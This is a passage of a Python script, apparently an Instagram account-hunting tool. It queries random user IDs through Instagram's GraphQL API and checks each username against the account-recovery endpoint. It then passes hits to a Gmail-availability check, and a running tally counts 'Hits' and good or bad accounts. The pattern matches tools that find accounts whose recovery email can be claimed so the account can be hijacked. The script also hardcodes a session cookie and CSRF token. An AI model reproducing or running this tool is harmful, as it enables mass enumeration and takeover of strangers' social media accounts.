  'X-Bloks-Version-Id': "009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0",
  'X-IG-Connection-Type': "WIFI",
  'X-IG-Capabilities': "3brTvw==",
  'X-IG-App-ID': "567067343352427",
  'Accept-Language': "ar-IQ, en-US",
  'X-FB-HTTP-Engine': "Liger",
  'Cookie': "mid=Z9YT7QABAAEd2QWsqjUsmbV9sVHi; csrftoken=XoEv8Rgt1v4V8IrfQFnw0jXUFoF72Ld2"
}

		response = requests.post(url, data=payload, headers=headers).json()
#		print(response)
		if 'can_recover_with_code' in response:
			self.good_insta+=1
			self.check_gmail(user)
			
			
			
			sys.stdout.write(f'''\rHits : {self.good_gmail} Bad insta : {self.bad_insta} Bad gmail : {self.bad_gmail} Good insta : {self.good_insta}\r''')
			sys.stdout.flush()
		else:
			self.bad_insta+=1
			sys.stdout.write(f'''\rHits : {self.good_gmail} Bad insta : {self.bad_insta} Bad gmail : {self.bad_gmail} Good insta : {self.good_insta}\r''')
			sys.stdout.flush()
	def serche(self):
		while True:
			crf="".join(random.choice('qwertyuiopRyjNkxiogUiaejkJbc7907422') for i in range(32))
			headers={'x-fb-lsd':crf}
			data = {
	
	    'lsd':crf,
	
	    'variables': json.dumps({"id":random.randint(17699999, 361365133),"render_surface":"PROFILE"}),
	
	    'doc_id':  "7397388303713986" 
	}
	
			r = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data).json()
#			print(r)
			try:
			   user=r['data']['user']['username']
#			   print(user)
			   self.check(user)
			except:""
Instagram()
